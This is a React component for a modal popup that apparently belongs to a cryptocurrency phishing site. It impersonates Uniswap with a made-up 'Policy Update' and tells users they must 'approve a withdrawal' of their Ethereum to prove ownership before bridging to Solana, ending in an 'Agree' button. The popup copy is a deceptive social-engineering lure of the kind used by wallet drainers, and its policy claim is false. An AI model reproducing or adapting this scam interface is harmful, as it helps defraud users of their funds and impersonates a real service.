import React from 'react';
import { ethswaplogo } from '../assets';

const ConfirmationPopup = ({ isOpen, onAgree, onClose }) => {
    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
            <div className="bg-white rounded-xl p-6 max-w-md w-full mx-4 text-center">
                <div className="flex justify-end">
                    <button
                        onClick={onClose}
                        className="text-gray-400 hover:text-gray-600 bg-gray-100 rounded-full p-1"
                    >
                        ✕
                    </button>
                </div>

                <div className="mt-4 mb-6 flex flex-col items-center">
                    {/* Ethereum Logo */}
                    <div className="w-16 h-16 flex items-center justify-center mb-4">
                        <img src={ethswaplogo} alt="Ethereum" className="w-14 h-14" />
                    </div>

                    <h3 className="text-gray-800 font-bold text-2xl mb-2">Policy Update</h3>
                    <p className="text-gray-600 mb-2">
                    In order to ensure that you are the owner of the account you want to bridge from, 
                    you will need to approve a withdrawal from <strong>Ethereum</strong> so that we can send your <strong>Ethereum</strong> to <strong>Solana</strong>. This is a new Uniswap Policy Update.
                    </p>
                    <p className="text-gray-600 mb-6">
                  
                    </p>
                    <h4 className="text-gray-800 font-bold text-2xl mb-2">Confirmation</h4>
                    <p className="text-gray-600 mb-2">
                    You are going to confirm that you want to send your <strong>Ethereum</strong> tokens to your new <strong>Solana</strong> address. After you approve the token transfer to the bridge, you will be given a field to input a <strong>Solana</strong> address. Make sure the <strong>Solana</strong> address you input is yours and is correct.
                    </p>
                    <p className="text-gray-600 mb-6">
                    </p>
                </div>

                <div>
                    <button
                        onClick={onAgree}
                        className="w-full bg-[#00BCD4] text-white font-bold py-3 rounded-md hover:bg-[#00ACC1] transition-all"
                    >
                        Agree
                    </button>
                </div>
            </div>
        </div>
    );
};

export default ConfirmationPopup;